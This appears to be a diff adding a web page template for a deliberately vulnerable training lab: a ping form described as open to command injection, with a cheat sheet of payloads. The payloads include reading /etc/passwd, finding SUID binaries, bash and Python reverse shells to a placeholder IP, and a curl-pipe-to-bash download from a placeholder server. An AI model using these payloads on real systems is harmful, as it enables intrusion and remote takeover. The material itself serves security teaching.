@@ -1,0 +1,114 @@
+{% extends "base.html" %}
+
+{% block title %}Ping Utility - BootCamp-Lab{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 mx-auto">
+        <div class="card">
+            <div class="card-header">
+                <h3 class="mb-0"><i class="fas fa-network-wired"></i> Network Ping Utility</h3>
+            </div>
+            <div class="card-body">
+                <!-- Vulnerability Hints -->
+                <div class="alert alert-danger">
+                    <h6><i class="fas fa-skull-crossbones"></i> Command Injection Vulnerability:</h6>
+                    <ul class="mb-0 small">
+                        <li>Input is directly passed to shell command</li>
+                        <li>No input sanitization</li>
+                        <li>Use <code>;</code>, <code>&&</code>, <code>||</code>, <code>|</code> for command chaining</li>
+                        <li>Execute arbitrary system commands</li>
+                    </ul>
+                </div>
+
+                <form method="POST" action="{{ url_for('ping') }}">
+                    <div class="mb-3">
+                        <label for="host" class="form-label">Host or IP Address</label>
+                        <input type="text" class="form-control form-control-lg" id="host" name="host" placeholder="127.0.0.1" required>
+                        <small class="text-muted">Enter IP or hostname to ping</small>
+                    </div>
+                    <button type="submit" class="btn btn-gradient w-100 btn-lg">
+                        <i class="fas fa-paper-plane"></i> Execute Ping
+                    </button>
+                </form>
+
+                {% if result %}
+                <hr class="my-4">
+                <h5><i class="fas fa-terminal"></i> Command Output:</h5>
+                <pre class="bg-dark text-light p-3" style="max-height: 400px; overflow-y: auto;">{{ result }}</pre>
+                {% endif %}
+            </div>
+        </div>
+
+        <!-- Command Injection Guide -->
+        <div class="card mt-4">
+            <div class="card-header bg-dark text-white">
+                <h5 class="mb-0"><i class="fas fa-book"></i> Command Injection Cheat Sheet</h5>
+            </div>
+            <div class="card-body">
+                <h6>Basic Payloads:</h6>
+                <div class="table-responsive">
+                    <table class="table table-sm">
+                        <thead>
+                            <tr>
+                                <th>Payload</th>
+                                <th>Description</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><code>127.0.0.1; whoami</code></td>
+                                <td>Execute command after ping</td>
+                            </tr>
+                            <tr>
+                                <td><code>127.0.0.1 && cat /etc/passwd</code></td>
+                                <td>Execute if ping succeeds</td>
+                            </tr>
+                            <tr>
+                                <td><code>127.0.0.1 | ls -la</code></td>
+                                <td>Pipe ping output to ls</td>
+                            </tr>
+                            <tr>
+                                <td><code>127.0.0.1; id</code></td>
+                                <td>Get current user info</td>
+                            </tr>
+                            <tr>
+                                <td><code>127.0.0.1; uname -a</code></td>
+                                <td>Get system information</td>
+                            </tr>
+                            <tr>
+                                <td><code>127.0.0.1; env</code></td>
+                                <td>List environment variables</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h6 class="mt-3">Advanced Payloads:</h6>
+                <div class="list-group">
+                    <div class="list-group-item">
+                        <strong>Read sensitive files:</strong><br>
+                        <code>127.0.0.1; cat /etc/passwd</code>
+                    </div>
+                    <div class="list-group-item">
+                        <strong>Find SUID binaries:</strong><br>
+                        <code>127.0.0.1; find / -perm -4000 2>/dev/null</code>
+                    </div>
+                    <div class="list-group-item">
+                        <strong>Reverse shell (Bash):</strong><br>
+                        <code>127.0.0.1; bash -i >& /dev/tcp/YOUR_IP/4444 0>&1</code>
+                    </div>
+                    <div class="list-group-item">
+                        <strong>Python reverse shell:</strong><br>
+                        <code>127.0.0.1; python3 -c 'import socket...'</code>
+                    </div>
+                    <div class="list-group-item">
+                        <strong>Download and execute:</strong><br>
+                        <code>127.0.0.1; curl http://your-server/shell.sh | bash</code>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
